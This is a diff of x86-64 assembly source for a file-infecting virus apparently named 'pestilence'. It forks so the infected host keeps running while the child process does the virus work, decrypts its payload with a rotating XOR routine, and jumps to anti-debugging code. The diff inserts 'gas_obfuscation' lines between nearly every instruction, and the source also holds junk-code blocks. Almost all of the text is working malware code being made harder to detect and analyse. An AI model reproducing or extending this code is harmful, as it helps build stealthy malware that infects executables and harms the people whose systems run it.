@@ -5,31 +5,47 @@ section .text
 
 _start:
 		; Fork process => Parent resumes host activity while Child does virus stuff
+gas_obfuscation 0xB0
 		mov rax, SYSCALL_FORK
+gas_obfuscation 0xB4
 		syscall
+gas_obfuscation 0xB4
 		cmp rax, 0
+gas_obfuscation 0x0C
 		jz .saveState
 
 ; Get address of host entry and jump to it [Parent]
 .jumpToHost:
+gas_obfuscation 0xB0
 		lea rax, [rel _start]
+gas_obfuscation 0x0C
 		sub rax, [rel payloadEntry]
+gas_obfuscation 0x24
 		add rax, [rel hostEntry]
+gas_obfuscation 0xB0
 		jmp rax
 
 .saveState:
 		; Save common registers
+gas_obfuscation 0x24
 		push rdi
+gas_obfuscation 0x24
 		push rsi
+gas_obfuscation 0xB0
 		push rcx
+gas_obfuscation 0x0C
 		push rdx
 
 		; Allocate space in stack for pestilence struct
+gas_obfuscation 0x0C
 		enter s_pestilence_size, 0
 
 .decryptPayload:
+gas_obfuscation 0x24
 		lea rdi, [rel _start.antiDebugMeasures]
+gas_obfuscation 0xB4
 		mov rsi, ENCRYPTION_SIZE
+gas_obfuscation 0xB0
 		mov rdx, [rel encryptionKey]
 
 ; JUNK CODE
@@ -40,8 +56,11 @@ add rcx, 0x45
 pop rax
 ; END JUNK CODE
 
+gas_obfuscation 0xB4
 		cmp rdx, 0
+gas_obfuscation 0x0C
 		je .antiDebugMeasures
+gas_obfuscation 0x24
 		call rotativeXOR
 
 .encryptionStart:
@@ -818,13 +837,19 @@ ret
 ; RDI => start address | RSI => size | RDX => encryption key                  *
 ; * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 rotativeXOR:
+gas_obfuscation 0xB0
 	mov rcx, rsi
 .startEncrypt:
+gas_obfuscation 0x0C
 	xor byte [rdi], dl
+gas_obfuscation 0xB4
 	ror rdx, 8
+gas_obfuscation 0x24
 	inc rdi
+gas_obfuscation 0x24
 	loop .startEncrypt
 .done:
+gas_obfuscation 0x0C
 	ret
 
 ; This data has to stay un-encrypted
